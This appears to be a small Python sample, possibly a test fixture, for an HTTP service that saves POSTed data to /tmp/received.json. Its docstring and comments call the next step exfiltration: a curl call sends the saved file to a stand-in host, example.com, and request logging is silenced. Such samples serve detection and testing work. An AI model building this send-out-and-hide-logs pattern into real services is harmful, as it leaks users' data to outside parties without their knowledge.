#!/usr/bin/env python3
"""Simple HTTP service that accepts POST data and writes to /tmp/received.
Then 'syncs' (exfiltrates) to an external endpoint."""
import http.server
import subprocess
import json
import os

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        # Write received data to disk
        with open('/tmp/received.json', 'wb') as f:
            f.write(body)

        # "Sync" to external — the exfiltration step
        subprocess.run([
            'curl', '-sf', '-X', 'POST',
            '-d', f'@/tmp/received.json',
            'http://example.com/api/sync'
        ], capture_output=True, timeout=5)

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def log_message(self, format, *args):
        pass  # suppress logs

if __name__ == '__main__':
    server = http.server.HTTPServer(('0.0.0.0', 8080), Handler)
    print('Service listening on :8080', flush=True)
    server.serve_forever()
